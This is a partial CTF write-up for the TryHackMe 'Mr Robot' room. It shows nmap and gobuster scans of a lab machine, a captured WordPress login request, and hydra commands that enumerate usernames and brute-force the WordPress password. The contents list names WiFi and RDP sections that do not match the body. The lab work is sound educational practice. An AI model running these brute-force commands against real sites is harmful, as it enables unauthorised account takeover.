#### THIS PAGE IS A WORKS IN PROGRESS ####


![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/109cc692-4ce9-4be0-83b8-935211f82301)

# Mr Robot CTF Writeup #
### [https://tryhackme.com/room/adv3nt0fdbopsjcap](https://tryhackme.com/room/mrrobot) ###

#  
### CONTENTS : ###
[TL;DR](#tldr-)

[PROCEDURE](#procedure-)

-  [Part 1 - Retrieving the WiFi SSID](#part-1---retrieving-the-wifi-ssid)
    
-  [Part 2 - Retrieving the WiFi Password](#part-2---retrieving-the-wifi-password)
    
-  [Part 3 - Decrypting and Analysing WiFi Traffic](#part-3---decrypting-and-analysing-wifi-traffic)
    
-  [Part 4 - Decrypting and Replaying a RDP Session](#part-4---decrypting-and-replaying-a-rdp-session)



### TL;DR : ###
#

Target IP: **``10.10.90.47``**

## FLAG 1 of 3 ##

>HINT: `Robots`

We are given a target IP  and a one-word hint that seems to be in-keeping with the overall Mr Robot theme of the room.

To start off, let's perform a NMAP scan just to see what services are running on the target:

```console
root@ip-10-10-140-73:~/mrobot# nmap -sV 10.10.90.47

Starting Nmap 7.60 ( https://nmap.org ) at 2024-02-07 09:03 GMT
Nmap scan report for ip-10-10-90-47.eu-west-1.compute.internal (10.10.90.47)
Host is up (0.00051s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd
MAC Address: 02:14:FF:13:8D:17 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.79 seconds
```

It looks like the server is just running a web-page which we can access by visiting `http://10.10.90.47/` in our browser.  This brings up a cool simulated console:

![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/5b168d2c-2a5b-48ba-8b7b-b64f0239b54d)

Trying to enter any of the commands offered on screen doesn't really lead anywhere, other than to give us some cool Mr Robot themed videos, pictures and text prompts. But it's worth noting that every command we enter redirects to a sub-url with the same name.  So for example if we enter the command `inform` it will take us to the `/inform` webpage.

Just as we'd normally do in a normal enumeration exercise (and also because fo that hint we got), we can take a look at the `robots.txt` file to see whether it contains anything interesting:

![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/cc7708d5-66c4-415b-8123-a309f57698b8)

From here we can see reference to two interesting files; `fsocity.dic` and `key-1-of-3.txt`.

We can simply look at the contents of `key-1-of-3.txt` by entering the URL `http://10.10.90.47/key-1-of-3.txt` in the browser or by using `curl`:

```console
root:~# curl http://10.10.90.47/key-1-of-3.txt
073403<R E D A C T E D>0724b9
```

## FLAG 2 of 3 ##

>Hint: `There's something fishy about this wordlist... Why is it so long?`


We should also go ahead and download a copy of `fsocity.dic`.  Having a look at its contents, it appears to be some kind of wordlist.  Based on past expereinces with similar CTF challenges, this indicates that we'll probably be needing this wordlist to perform a bruteforce password cracking at some point later on.

For the time being, let's take a closer look at the website and see whether we can find an interestiugn directories.  We can use `gobuster` with a medium wordlist for this:

```console
root:~# gobuster dir -u http://10.10.90.47 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 1000 -q
/video (Status: 301)
/admin (Status: 301)
/wp-content (Status: 301)
/atom (Status: 301)
/0 (Status: 301)
/audio (Status: 301)
/feed (Status: 301)
/css (Status: 301)
/intro (Status: 200)
/images (Status: 301)
/sitemap (Status: 200)
/image (Status: 301)
/Image (Status: 301)
/wp-login (Status: 200)
/rss2 (Status: 301)
```

Interestingly we can see a `/wp-login` page and if we try accessing this we are served a Wordpress login page! :)

If we try logging in with username `admin` and password `admin` (just to see what happens).  The page serves up an error saying **_Invalid username_**.  This is actually great news fopr us as this means we have a way of trying out multiple usernames and finding out which of them are valid.

![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/59c85716-60e0-4cb6-a03d-2dbc19ef8298)

We can do this quite easily using a tool such as `hydra` and it makes sense to use the `fsocity.dic` wordlist we found earlier to attempt this.  But first let's fire up Burp Suite and have a look at what happens when we submit a username and password.  This will allow us to consturct the proper hydra command we need to use.

```http
POST /wp-login.php HTTP/1.1
Host: 10.10.90.47
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 100
Origin: http://10.10.90.47
Connection: close
Referer: http://10.10.90.47/wp-login.php
Cookie: s_cc=true; s_fid=5C779EDA99811D07-07120F123BF26DC4; s_nr=1707297020912; s_sq=%5B%5BB%5D%5D; wordpress_test_cookie=WP+Cookie+check
Upgrade-Insecure-Requests: 1

log=admin&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.90.47%2Fwp-admin%2F&testcookie=1
```

We can see a http POST request being made that passes the username as the variable `log` and the password as the variable `pwd`.  We can now use this information so that hydra can enumarte valid usernames with the following command:

```console
root:~# hydra -L fsocity.dic -p abcdef 10.10.5.136 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username"
```

Let's take a closer look at the parameters we're passing on to hydra in this command:
- `-L <filename>` passes a wordlist to be used when brute forcing logins/passwords.  In our case we will be using the file `fsocity.dic` which we downloaded earlier
- `-p <password>` specifies the password to use.  Since we are just trying to enumarate usernames for the time being, we can use any random string here.
- `http-post-form` tells hydra to use the http post method (since this is what we saw in Burp Suite).
- `/wp-login.php:log=^USER^&pwd=^PWD^:Invalid Username`  This part tells hydra the strcuture that the http post request should take. In our case we copy this from the captured post in Burp Suite and replace the username and password with the placeholders `^USER^` and `^PWD^` respectively.  The "`Invalid Username`" is a string we're expecting to recieve in the http response whenever the username is incorrect.

Hydra gives us the following output telling us that from the `fsocity.dic` file provided it has identified `Elliot` as a valid username.

```console
[DATA] attacking http-post-form://10.10.5.136:80//wp-login.php:log=^USER^&pwd=^PWD^:Invalid username
[80][http-post-form] host: 10.10.5.136   login: Elliot   password: abcdef
```

We can now try running the attack again but this time using `Elliot` as the username and brute-forcing the password field.

```console
root:~# hydra -l elliot -P fsocity.dic 10.10.5.136 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered"
```
This time we're using the `-l` switch with username `elliot` and the `-P` switch instead of `-p` to use a wordlist file.  Note that the failure message has also been changed to "The password you entered" to reflect part of the error message we get when we try logging in with the correct username but an incorrect password.
